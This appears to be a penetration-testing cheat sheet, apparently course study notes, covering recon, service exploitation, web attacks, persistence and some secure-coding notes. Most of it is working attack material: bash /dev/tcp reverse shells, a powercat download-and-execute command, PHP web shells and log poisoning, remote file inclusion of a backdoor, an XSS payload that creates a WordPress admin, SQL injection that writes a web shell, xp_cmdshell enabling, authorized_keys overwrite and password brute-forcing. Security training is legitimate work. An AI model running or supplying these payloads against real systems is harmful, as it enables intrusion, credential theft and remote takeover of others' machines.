
# Phases

## Pre-engagement
- Non-Disclosure Agreement (NDA)	After Initial Contact
- Scoping Questionnaire	Before the Pre-Engagement Meeting
  - Internal Vulnerability Assessment
  - External Vulnerability Assessment
  - Internal Penetration Test
  - External Penetration Test
  - Wireless Security Assessment
  - Application Security Assessment
  - Physical Security Assessment
  - Social Engineering Assessment
  - Red Team Assessment
  - Web Application Security Assessment
- Scoping Document	During the Pre-Engagement Meeting
- Penetration Testing Proposal (Contract/Scope of Work (SoW))	During the Pre-engagement Meeting
- Rules of Engagement (RoE)	Before the Kick-Off Meeting
- Contractors Agreement (Physical Assessments)	Before the Kick-Off Meeting
- Reports	During and after the conducted Penetration Test

## Information gathering

### Passive
- whois
  - forward lookup (hostname -> ipaddress)
    - `shell for ip in $( cat /usr/share/seclists/Discovery/DNS/namelist.txt ); do host $ip.megacorpone.com | grep -v "not found"; done`
    - `shell nslookup <hostname`
    - `shell nslookup <hostname> <nameserver`
    - `whois megacorpone.com -h 192.168.50.251`
  - reverse lookup (ip address -> hostname) 
    - `shell for ip in $( seq 1 255 ); do; host 192.168.176.$ip; done; | grep -v "not found"`
    - `shell nslookup <ipaddress>`
    - `whois 38.100.193.70 -h 192.168.50.251`
  - [google dorks](https://dorksearch.com/)
    - `site:`
    - `intitle:`
    - `inurl:`
    - `intext:`
    - `intitle:`
    - `cache:`
  - [recon-ng](https://www.geeksforgeeks.org/recon-ng-installation-on-kali-linux/)
    - modules
      - discovery/info_disclosure/interesting_files
      - recon/domains-hosts/google_site_web
      - recon/hosts-hosts/resolve
    - [theharvester](https://github.com/laramies/theHarvester)
    - [sitereport.netcraft.com](https://sitereport.netcraft.com/)
    - [gitleaks](https://github.com/zricethezav/gitleaks)
    - [showdan](https://www.shodan.io/)
    - [security headers](https://securityheaders.com/)
      - if score is low, may indicate that server admins are not familiar with server hardening practices
    - [ssl server test](https://www.ssllabs.com/ssltest/)
      - can indicate vulnerablities such as Poodle, HeartBleed or just weak key exchanges
    - [pastebin](https://pastebin.com/)
    - social media
      - [socialsearcher](https://www.social-searcher.com/)
      - twitter? use [Twofi1](https://digi.ninja/projects/twofi.php)
      - linkedin? use [linkedin2username](https://github.com/initstring/linkedin2username)
      - stack overflow
    - [OSINT Framework](https://osintframework.com/)
    - [Maltego](https://www.maltego.com)

### Active
- <span style="color:orange">NOTE: </span> 
  - may need to modify /etc/resolve.conf to add a nameserver
  - may need to modify /etc/hosts to add a host address
  - document the operating system if possible (google to identify additional information)

#### Windows
- Powershell 
  - `1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null`

#### Network sweep
- [nmap](https://securitytrails.com/blog/nmap-commands)
  - `nmap -sP 208.109.192.*`
  - `nmap -sP 208.109.*.*`

#### Port scan
- [nmap](https://securitytrails.com/blog/nmap-commands)
  -  ippsec scan
     -  `sudo nmap -sC -sV -oA target/nmap -v 192.168.50.242`
     - -sC          use default scripts
     - -sV          enable service and version detection
     - -sU          upd ports
     - -oA          outputs to all formats [basename].nmap, [basename].xml, [basename].gnmap
     - -v           verbosity
     - -p 1-65535   all ports (takes longer)
  - port scan
    - `sudo nmap -v -p 50000-65535 $IP`
  - find 
- [netcat]()
    - TCP scaning using Connect (3way handshake - SYN - SYNACK - ACK)
      - `nc -nvv -w 1 -z $IP 1-1000`
    - UDP scanning (prone to false positives)
      - `nc -nv -u -z -w 1 $IP 100-200`

#### SMB scan
- nmap
  - `nmap -v -p 139,445 192.168.100.1`
  - `nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152`
- nbtscan
  - `sudo nbtscan -r 192.168.50.0/24`
- windows
  - `net view \\dc01 /all`
- enum4linux
  - `cat 6343/smb.lst | while read line; do enum4linux -a $line; done`
- [nbtscan]()
  -  `sudo nbtscan -r 10.11.1.0/24`

#### SMTP scan
- commands
 - verify an email exists
   - `VRFY`
 - membership of an mailing list
   - `EXPN`
- python
 - [smtpverify](/code/python/scripts/smtpverify.py)
   - `python3 smtpverify.py bob 192.168.50.8`
- windows
 - telnet
   - install (requires admin) or transfer binary
     - `dism /online /Enable-Feature /FeatureName:TelnetClient`
   - `telnet 192.168.50.8 25`

#### SNMP (UDP 161)
- nmap
  - `sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt`
- onesixtyone
  - communities.txt
    - `echo public > communities.txt && echo private >> communities.txt && echo manager >> communities.txt`
  - ips.txt
    - `for ip in $(seq 1 254); do echo 192.168.208.$ip; done > ips.txt`
  - `onesixtyone -c communities.txt -i ips.txt`
- snmpwalk
  - the read only community string is usually "public"
    - `snmpwalk -c public -v1 -t 10 192.168.50.151`
  - management information base MIB
    - Interfaces
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.2.2.1.2`
    - System Processes
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.1.6.0`
    - Running Programs
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2`
    - Processes Path
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.4`
    - Storage Units
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.2.3.1.4`
    - Software Name
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2`
    -	User Accounts
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25`
    - TCP Local Ports
      - `snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3`

#### host
- `host www.megacorpone.com`
- `host -t mx www.megacorpone.com`
  - -t    mx | a | txt
  - -a    s equivalent to -v -t ANY
- `for ip in $(cat /usr/share/dnsenum/dns.txt); do host $ip.megacorpone.com; done`
  - use reverse look ups on ip ranges based on hits from above
    -  mail.megacorpone.com has address 51.222.169.212
       -  `for ip in $(seq 1 254); do host 51.222.169.$ip; done | grep -v "not found"`
#### dns zone transfers 
- ```shell ./dns.axfr.sh megacorpone.com```
- ```shell dnsrecon -d megacorpone.com -t axfr```
- ```shell dig -domain megacorpone.com @dc.mailman.com```

#### dnsrecon
- `dnsrecon -d megacorpone.com -t axfr`
  - -t axfr | std
  - brute force
    - `dnsrecon -d megacorpone.com -D ~/list.txt -t brt`
      - -brt    brute force

#### dnsenum
- `dnsenum abc.com`

#### windows
- `nslookup mail.megacorptwo.com`
- `nslookup -type=TXT info.megacorptwo.com`

#### masscan
  - sudo apt install masscan
  - sudo masscan -p80 10.11.1.0/24 --rate=1000

#### vulnerablity scans
- nessus essentials
  - list users
    - `/opt/nessus/sbin/nessuscli lsuser`
  - change password
    - `/opt/nessus/sbin/nessuscli chpasswd`
- nmap
  - <span style="color:orange">NOTE: </span>
    - NSE scripts marked "intrusive" can crash servers, only use safe!
  - `nmap -sV --script "vuln" -oA 7311/vulnscan 192.168.187.13 -v`
    - -sV               service detection scripts
    - --script "vuln"   means run all scripts categorised as "vuln"
  - `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.187.13`
    - `curl http://192.168.187.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 
      - run the verify arbitary file read and /etc/passwd is shown



### Exploit

#### 21 ftp
- try anonymous:anonymous
  - `ftp 10.0.0.3`
- hydra
  - `hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f 10.0.0.3 ftp`

#### 22 ssh
- if SSH private key is known
  - save private key to file `id_rsa`
  - change permissions `chmod 600 pkey.txt`
    - if prompted for password, you will need to crack using JohnTheRipper
  - `ssh -i pkey.txt daniela@192.168.50.244`
- brute force using [hydra](https://www.hackingarticles.in/a-detailed-guide-on-hydra/)
  - `hydra -l kali -P /usr/share/wordlists/rockyou.txt 192.168.50.244 ssh`
    - -l username
    - -P word list
    - resume attack if halted
      - `hydra -R`
    - -x 1:3:aA1%$#
      - min     number of chars
      <!-- - max     number of chars -->
      - charset
        - a     lowercase
        - A     uppercase
        - 1     numbers
        - %$#   any special chars

#### 25 smtp
- todo 

#### 80,443  www
- if you see a http title in the nmap results, chances of a website increase
- enumerate
  - search for interesting links on the page and add them to your hosts file
    - `curl -f -L http://192.168.225.47 | grep -Eo "https?://\S+?\""`
  - look for user accounts and formats
    - `firstname.lastname@email.com`
  - look for insecure direct object references
    - urls containing id values that can easily be enumerated
      - user1 can be changed to user2 or user3 `http://www.site-example.com/users/calendar.php/user1/20070715`
  - look for cross site scripting opportunities
    - can we insert xss into the backend to capture an admins creds?
  - check for business logic flaws such as being able to change the purchase price of an object on the page
  - 
  - [google hacking database](https://www.exploit-db.com/google-hacking-database)
  - robots.txt
  - sitemap.xml
  - nmap
    - `sudo nmap -p80 --script=http-enum 192.168.50.20`
  - <span style="color:orange">NOTE: </span> windows is case insensitive, use shorter lists
  - [gobuster](https://null-byte.wonderhowto.com/how-to/scan-websites-for-interesting-directories-files-with-gobuster-0197226/) 
    - if you have a standard error page and receive a "please exclude the status code or length" you need to add  
      - --exclude-length 40182
    - `gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config`
      - -dir    for directory enumeration
      - -u      for the url
      - -w      wordlist
      - -x      comma seperated files we want to identify
      - -t5     reduce threads to 5 (default is 10) 
  - [fuff - fast web fuzzer](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html)
    - `ffuf -u http://$IP/FUZZ -w /usr/share/dirb/wordlists/common.txt`
      - -u target url where FUZZ is replaced
      - -w wordlist
  - [dirb](https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86)
    - `dirb http://webscantest.com /usr/share/dirb/wordlists/vulns/apache.txt`
      - /usr/share/dirb/wordlists/vuln
    - `dirb http://webscantest.com`
- view source for potential information regarding the site framework or use [whatweb](https://www.kali.org/tools/whatweb/)
  - `whatweb -v -a 3 192.168.0.102`
    - -v    verbose ouptut
    - -a    agression level | 1 stealthy | 3 Aggressive | 4 Heavy |
- API
  - common ways of restricting apis
    - http referrers
    - ip address
    - application signatures (android) or bundleid (IOS)
  - [gobuster]
    - `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt`
      - -p      new pattern each line using {GOBUSTER}/v1 
      - drill down into each endpoint 
        - `gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt`
        - `curl -i http://192.168.50.16:5002/users/v1/admin/password` 
        - can you change passwords?
          - `curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`
        - create a new user
          - `curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register`
        - log in 
          - `curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`
          - returns {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew"}
        - change admins password
          - ```s
            curl -X 'PUT' \
            'http://192.168.50.16:5002/users/v1/admin/password' \
            -H 'Content-Type: application/jso
            -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
            -d '{"password": "pwned"}'
            ```
        - confirm you can login as admin
          - `curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`
        - curl can use a proxy (which means you can send it to burp)
          - `--proxy 127.0.0.1:8080`
- javascript 
  - Same-Origin Policy (SOP) is a protective mechanism that web browsers implement that prevents resources loaded on one origin from accessing resources loaded from a different origin.
    - `u = new URL("https://www.offensive-security.com/blog")`
    - `u.origin`
- Cross Site Scripting (XSS)
  - stored xss means stored in a database or similar
    - examing php source code database.php from wordpress plugin Visitors which captures the $_SERVER['HTTP_USER_AGENT'] 
      - using burpsuite we change our request to send a modified User-Agent string `<script>alert('42');</script>`
      - every time the Visitors page is now loaded, we get a javascript alert saying 42
  - reflected xss means the payload is a crafted request or link
  - dom based occurs within the documents object model
  - most common characters are 
    - `< > ' " { } ;`
  - url encoding - convert non-ASCII and reserved characters in URLs, such as converting a space to "%20".
  - html encoding - is used to display characters that have special meaning in html like < >
- Cookie stealing - check wordpress section for example
- httponly flag means the cookie can not be accessed via javascript and you will need to pivot
- Secure flag instructs the browser to only send cookies over https (encrypted channels) and protects the cooke from being sent in clear text
- directory traversal
    - example ` http://mountaindesserts.com/meteor/index.php?page=admin.php` 
      - use curl and modify the querystring to
        - <span style="color:orange">NOTE: </span> try ../ or ..\ or url encoded "'" %2e
        - target /etc/passwrd `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
        - target .ssh/id_rsa `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
        - url encoded `curl http://192.168.189.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords`
        - windows
          - log files `C:\inetpub\logs\LogFiles\W3SVC1\`
          - web.config `C:\inetpub\wwwroot\web.config`
- file inclusion
  -  allow us to "include" a local or remote file in the application's running code
  -  local file inclusion
     -  log poisoning works by modifying data we send to the application so that the logs contain executable code
        - if we have access to the log files via a local file inclusion, we can modify the user agent to run a cmd
        - `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`
        - `User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) <?php system('dir'); ?> Gecko/20100101 Firefox/102.0`
        - exec cmd OR reverse shell
          - `GET /meteor/index.php?page=../../../../../../../../../../var/log/apache2/access.log?cmd=ls%20-la`
          - `GET /meteor/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=cat%20/opt/admin.bak.php`
          - reverse shell
            - `bash -c "bash -i >& /dev/tcp/192.168.45.190/4444 0>&1"`
              - url encode `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.210%2F4444%200%3E%261%22`
        - windows
          - `http://192.168.237.193/meteor/index.php?page=\xampp\apache\logs\access.log`
- remote file inclusion
 - php
   - requires allow_url_include 
   - host /usr/share/webshells/php/simple-backdoor.php using python `python3 -m http.server 80`
   - `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"`
   - [pentestmonkey php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
- command injection
  - CHECK
    - &
    - ;
    - Newline (0x0a or \n)
    - &&
    - |
    - ||
    - command `
    - $(command )
  - <span style="color:orange">NOTE: </span> identify the shell that is currently in use
    - `ps -p $$`
    - `ps -x `
    - 
  - try && to append a command to bypass filters
    - `git version && ipconfig`
  - break commands with ; 
    - `%3B`
  - are we in cmd or powershell?
    - ```(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell```
  - execute powercat
    - `git version;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.187/powercat.ps1"); powercat -c 192.168.45.187 -p 4444 -e ps -v`
    - url encoded `curl -X POST --data 'Archive=git%20version%3BIEX%20%28New%2DObject%20System%2ENet%2EWebclient%29%2EDownloadString%28%22http%3A%2F%2F192%2E168%2E45%2E187%2Fpowercat%2Eps1%22%29%3B%20powercat%20%2Dc%20192%2E168%2E45%2E187%20%2Dp%204444%20%2De%20ps%20%2Dv%0A%0A%0A' http://192.168.50.189:8000/archive`
- json web tokens (JWT)
  - [verify jwt](https://jwt.io/)
  - contains header, payload and signature each base64 encoded and seperated by .
    - xxxx.yyyyy.zzzz
    - header
      - `{ "alg": "HS256", "typ": "JWT"}`
        - alg = algorithm
        - typ = format of our token
    - payload
      - `{  "sub": "852208",  "name": "J. Moran",  "admin": false,  "iat": 1660166548,  "exp": 1660176548}`
        - requires 
          - -iat    timestamp the token was issued  (unix)
          - exp     when the token will expire
          - sub     which identifies the user that owns the token
    - signature
      - `HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), oursecretkey)`
      - [Examples of creating base64 hashes using HMAC SHA256 in different languages](https://www.jokecamp.com/blog/examples-of-creating-base64-hashes-using-hmac-sha256-in-different-languages/#js)
    - `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4NTIyMDgiLCJuYW1lIjoiSi4gTW9yYW4iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTY2MDE2NjU0OCwiZXhwIjoxNjYwMTc2NTQ4fQ.HhhomDA0UHxY2Lf4uhfCAEEjqLZLy1JGu4zhJZXcCqs`
    - add the jwt to header
      - `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4NTIyMDgiLCJuYW1lIjoiSi4gTW9yYW4iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTY2MDE2NjU0OCwiZXhwIjoxNjYwMTc2NTQ4fQ.HhhomDA0UHxY2Lf4uhfCAEEjqLZLy1JGu4zhJZXcCqs`



#### Web frameworks
- wordpress
  - search for users
    - `wpscan --url alvida-eatery.org --enumerate u > wpusers.lst`
  - search for wordpress vulnerablities using [wpscan](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)
    - `wpscan --url http://alvida-eatery.org/ --enumerate p --plugins-detection aggressive -P /usr/share/wordlists/rockyou.txt `
      - --url           the url we are targeting
      - --enumerate p   for popular plugins
      - -o              save results to file
      - -P              will attempt a password brute force attempt on the site
  - [xss payload to create admin user](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) 
    - get the nounce which is a server generated token that adds randomness to provent cross site request forgery and then create an ajax request to create a new user
      - ```s
          var ajaxRequest = new XMLHttpRequest();
          var requestURL = "/wp-admin/user-new.php";
          var nonceRegex = /ser" value="([^"]*?)"/g;
          ajaxRequest.open("GET", requestURL, false);
          ajaxRequest.send();
          var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
          var nonce = nonceMatch[1];
          #the nounce is then used to to create a new admin user
          var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
          ajaxRequest = new XMLHttpRequest();
          ajaxRequest.open("POST", requestURL, true);
          ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          ajaxRequest.send(params);
        ```
    - [minify so it becomes one line](https://codebeautify.org/minify-js)
    - encode it so that any bad characters wont interfere with the script
    - ```js
        function encode_to_javascript(string) {
                    var input = string
                    var output = '';
                    for(pos = 0; pos < input.length; pos++) {
                        output += input.charCodeAt(pos);
                        if(pos != (input.length - 1)) {
                            output += ",";
                        }
                    }
                    return output;
                }
        let encoded = encode_to_javascript('insert_minified_javascript')
        console.log(encoded)
      ```
  - wrap in curl
    - ```js
        curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,,101,113,117,101,115,116,46, ETC ETC ETC ,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
      ```
  - reload the visitor module to execute the user agent string above
  - we have admin account in wordpress
- [insert php using php code snippets](https://help.xyzscripts.com/docs/insert-php-code-snippet/user-guide/php-code-snippets/)
  - php single line 
    - `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
    - php
      - wrappers
        - base64 admin.php via php://filter/convert.base64-encode/resource
          - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
          - `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`
        - code execution via data://
          - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
          - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20%2Da%0A');?>"`
          - try encoding php to bypass filters
            - `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` = PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
            - `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
  - file upload vulnerabilities
    - what can I upload? .txt, .php, .docx
      - change the CaSe of the extension as well .pHp or .pHP
      - check for alternate file types as well such as .phps or .php7 
    - executable files
      - like `simple-backdoor.pHP`
    - non-executable files
      - can we overwrite a file? If we can we may be able to overwrite the authorized_keys file and ssh into the server
        - `ssh-keygen -f fileupload -N "secret" && cat fileupload.pub > authorized_keys`
        - upload the `authorized_keys` file through the file upload form on the website and intercept with burp 
          - change the filename to try and overwrite the root user's authorized_keys file
          - `filename="../../../../../../../root/.ssh/authorized_keys"`
  - Brute force website
    - basic authentication
      - curl
        - `curl -v -u "student:studentlab" "http://webservices/"`
          - -u username password
      - [medusa](https://www.hackingarticles.in/a-detailed-guide-on-medusa/)
        - `medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
          - -h  target hostname or ip
          - -u  username to test
          - -P  files containing passwords to test
          - -M  module to use
            - list all modules `medusa -d`
            - get help on a module `medusa -M http -q`
      - [hydra](https://www.hackingarticles.in/a-detailed-guide-on-hydra/)
        - `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/`
#### 139, 445 smb
  - hydra
    - `hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f 10.0.0.3 smb`

#### 3389 rdp
- brute force using [crowbar](https://neverendingsecurity.wordpress.com/2015/04/13/crowbar-a-brute-forcing-tool-that-can-be-used-during-penetration-tests/)
  - `sudo apt install crowbar`
  - `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
    - -b protocol to use
    - -s target server
    - -u username
    - -C path to wordlist

#### 1433, 3306 sql
- mysql
  - `mysql -u root -p'root' -h 192.168.50.16`
  - `use database`
  - current user `select system_user();`
  - list databases `show databases;`
    - list tables `show tables;`
  - get authentication string (caching_sha2_password) `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`
  - write to file system
    - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
      - if you receive an error message, try browsing to the file anyway `http://192.168.123.123/webshell.php?cmd=whoami`
- sqlserver
  - `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
  - underlying OS `system @@version;`
  - list databases `SELECT name FROM sys.databases;`
    - list tables `SELECT * FROM offsec.information_schema.tables;`
  - code execution
    - xp_cmdshell
      - enable advanced options 
        - `EXECUTE sp_configure 'show advanced options', 1;`
        - `RECONFIGURE;`
        - `EXECUTE sp_configure 'xp_cmdshell', 1;`
        - `RECONFIGURE;`
      - `EXECUTE xp_cmdshell 'whoami';`
- sql injection
  - `$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`
  - input field
    - authenticate `offsec' OR 1=1 -- //`
    - error based payloads
      - `' or 1=1 in (select @@version) -- //`
        - warning 1292: truncated incorrect DOUBLE value '8.0.28'
      - `' OR 1=1 in (SELECT * FROM users) -- //`
        - identifies one column at a time
      - `' or 1=1 in (SELECT password FROM users) -- //`
        - errors
      - `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
        - returns hashed user creds
    - union based payloads
      - determine the exact number of columns by iterting until you get an error
        - `' ORDER BY 1-- //`
      - get current database, user, version
        - `%' UNION SELECT database(), user(), @@version, null, null -- //`
      - `' UNION SELECT null, null, database(), user(), @@version  -- //`
      - database structure
        - `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
      - user creds
        - `' UNION SELECT null, username, password, description, null FROM users -- //`
    - blind sql payloads
      -  meaning the response is never returned
      -  use time based to identify the database (dumping via this method takes a long time)
         -  `' AND IF (1=1, sleep(3),'false') -- //`
- automation
  - sqlmap
    - identify if vulnerable
      - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`
        - -u    url
        - -p    input paramter to test    
    - dump database
      - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`
      - `sqlmap -r test.txt -p item --dump`
    - prompt for interactive shell
      - capture http post in burp and save to post.txt
      - determine the webserver language - php, asp, aspx, jsp
      - `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`


## Exploit
- Search for exploits using [searchsploit](https://www.exploit-db.com/searchsploit)
  - by name           `searchsploit duplicator`
  - by exploitdb id   `searchsploit -x 50420`
  - copy exploit -m   `searchsploit -m 50420`
  - use exploit by reading instructions located in the copied file
    - `python3 50420.py http://192.168.50.244 /etc/passwd`
  - payloads
    - [powercat](https://github.com/besimorhino/powercat)
      - install
        - Generate an encoded reverse shell payload (easily detected so always encode payload)
          - `powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1`
            - -ge     Generate Encoded Payload

## Persistence
- create a new user with rdp privs
- add our ssh key
- scheduled tasks

## Techniques

### secure coding
- a trust boundary is a point where data or commands change permission levels
  - application server to internet
  - database server to application server
- subresource integrity (SRI) 
  - checks to make sure the hash of the object matches the pre-calculated hash in the resource
    - `<script src="scripts/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>`
- input validation
  - mantra
    - resolve/decode before validating
    - server side validation
    - validation is the first line of defense
    - always reject invalid inputs
  - dangerous chars
    - `< > ' " ; * : { }`
  - blocklist validation blocks all known bad values - block `<>`
  - allowlist validation only allows good values - allow `a-zA-Z0-9`
  - pattern validation follows a known patter such as email address `/[\w.]+@\w+.\w+/`
  - syntactic data validation checks if the data is in the right format
  - semantic data validation checks if it is logical
    - range checking
    - date checking
    - email checking
- output encoding
  - php
    - `htmlentities("A 'quote' is <b>bold</b>") = A 'quote' is &lt;b&gt;bold&lt;/b&gt;`
  - python
    - `import html; html.escape("A 'quote' is <b>bold</b>") = 'A &#x27;quote&#x27; is &lt;b&gt;bold&lt;/b&gt;'`
- character escaping means the next character should be interpretted as text
  - `var escString = "I am a string with \"delimiters\" inside!";`
- validate file format and extension
  - use endswith rather than includes to check the format
    - `var filename = "fake.jpg.exe"; filename.includes(".jpg") = true; filename.endswith(".jpg")=false;`
    - python `import os; extension = os.path.splitext('D:\Work TP.py')[1];`
  - if linux can use `file` but bad because already written to disk
- path normalisation 
  - attackers use relative paths `../` or absolute paths `c:\temp\`
  - python `import os; print (os.path.normpath("/foo/../bar")) = '/bar'; 
- always write to file paths outside the www root so they cannot be browsed to
- rename files so they have a unique file name 
- sql injection
  - mysqli::real_escape_string() function in PHP escapes special characters in a string
  - use parameterised queries
    - php
      - `$stmt =  $conn->prepare('INSERT INTO users(username, password) VALUES (?, ?)'); $stmt->bind_param('ss',$username, $passwordhash);$stmt->execute();$stmt->close();`

### web session management
- [tls handshake](https://www.cloudflare.com/en-au/learning/ssl/what-happens-in-a-tls-handshake/)
- sessions 
  - are identified by a unique session token and can timeout based on absolute or idle times
  - `sessionID = eyJpZCI6ImQ2ZGU5NmQwLWNhNmMtNTRmYi05ZWVhLWVlMWY4YzE4M2M3YiIsImNyZWF0ZWQiOjE2ODI0NzA2MzE0MjQsImV4aXN0aW5nIjp0cnVlfQ==`
  - some frameworks can be identified by their default session id names
    - PHP: PHPSESSID
    - Ruby on Rails: _session_id
    - Django (Python): sessionid
    - Express.js (Node.js): connect.sid
    - ASP.NET: ASP.NET_SessionId
    - Laravel (PHP): laravel_session
    - CodeIgniter (PHP): ci_session
    - Symfony (PHP): PHPSESSID
    - Flask (Python): session
- cookies
  - are set on the client `Set-Cookie: name1=value1`
  - included by the server `Cookie: name1=value1; `
  - session cookies usually expire once the session ends
  - expire based on 
    - expiry time
      - `Set-Cookie: name3=value3; Expires=Mon, 01 Jan 2022 00:00:00 GMT;`
    - from when the session begins
      - `Set-Cookie: name2=value2; Max-Age=600;`
  - cookies can be restrcited to domain or domain and path
    - `Set-Cookie: name3=value3; Domain=domain.com; Path=/accounts;`
  - protect against xss (httpOnly) and mitm(Secure) means only https requests
    - `Set-Cookie: name1=value1; Secure; HttpOnly;`
- single sign on (sso)
  - user authenticates and is able to access multipe resources using that authentication
  - The SAML process has three main parties: a user (the client), an identity provider (IdP),4 and a service provider (SP).5
    - First, the user requests access to a SP.
    - The SP sends an authentication request to the IdP.
    - The IdP confirms the authentication request, and then the user can authenticate with the IdP.
    - Once the IdP has validated the user's identity, the IdP will craft a SAML assertion and send it to the SP. The assertion is a group of Extensible Markup Language (XML)6 statements that detail the permissions the user has. The SP uses these statements to decide what resources the user can have access to.
    - The SP uses the assertion to provide proper access (or authorization) based on the data within the assertion.





### Upgrade to interactive shell
  - [hacktricks.xyz](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
  - python
    - `python -c 'import pty; pty.spawn("/bin/sh")'`
    - `python3 -c 'import pty; pty.spawn("/bin/sh")'`
  - perl
    - `perl -e 'exec "/bin/sh";'`
    - `perl: exec "/bin/sh";`


### hash/passwords/keys
- `hashcat --example-hashes`
- using [john the ripper](https://www.golinuxcloud.com/john-the-ripper-password-cracker/)
